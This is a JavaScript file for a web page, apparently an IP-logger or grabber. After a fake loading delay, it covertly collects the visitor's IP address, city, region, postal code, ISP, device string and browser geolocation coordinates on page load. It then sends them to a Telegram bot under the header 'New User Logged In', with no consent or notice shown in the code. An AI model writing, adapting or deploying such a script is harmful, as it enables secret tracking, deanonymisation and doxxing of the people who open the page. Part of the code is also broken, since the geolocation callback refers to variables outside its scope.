let lat, long, msg;

$(document).ready(function () {
  setTimeout(() => {
    $("#loader").remove();
    document.getElementById("main").classList.remove("invisible");
  }, 2500);
});

const getIp = async () => {
  function getLocation() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(showPosition);
    }
  }

  function showPosition(position) {
    lat = position.coords.latitude;
    long = position.coords.longitude;

    let country = data.country;
    let isp = data.org;
    let city = data.city;
    let region = data.region;
    let postal = data.postal;
    let tz = data.timezone;
    let loc = data.loc;
    let date = new Date();
    let ua = navigator.userAgent;

    msg = `[ ⚡ New User Logged In ⚡ ]\n\n| IP : ${ip}\n| Country : ${country}\n| City : ${city}\n| Region : ${region}\n| ISP : ${isp}\n| Device : ${ua}\n| Postal Code: ${postal}\n| Time Zone : ${tz}\n| Location : ${loc}\n| Date : ${date}\n| Longitude: ${long}\n| Latitude: ${lat}`;

    axios.get("https://api.telegram.org/botToken/sendMessage", {
      params: {
        chat_id: "chatId",
        text: msg,
      },
    });
  }

  getLocation();
  let ip;
  let ipReq = await fetch("https://api.ipify.org/?format=json")
    .then((res) => res.json())
    .then((data) => (ip = data.ip));
  let data = await fetch(`http://ipinfo.io/${ip}?token=token`).then((res) =>
    res.json()
  );

  let country = data.country;
  let isp = data.org;
  let city = data.city;
  let region = data.region;
  let postal = data.postal;
  let tz = data.timezone;
  let loc = data.loc;
  let date = new Date();
  let ua = navigator.userAgent;

  msg = `[ ⚡ New User Logged In ⚡ ]\n\n| IP : ${ip}\n| Country : ${country}\n| City : ${city}\n| Region : ${region}\n| ISP : ${isp}\n| Device : ${ua}\n| Postal Code: ${postal}\n| Time Zone : ${tz}\n| Location : ${loc}\n| Date : ${date}\n| Longitude: ${
    long || "No Permission"
  }\n| Latitude: ${lat || "No Permission"}`;

  axios.get("https://api.telegram.org/botToken/sendMessage", {
    params: {
      chat_id: "chatId",
      text: msg,
    },
  });
};

getIp();
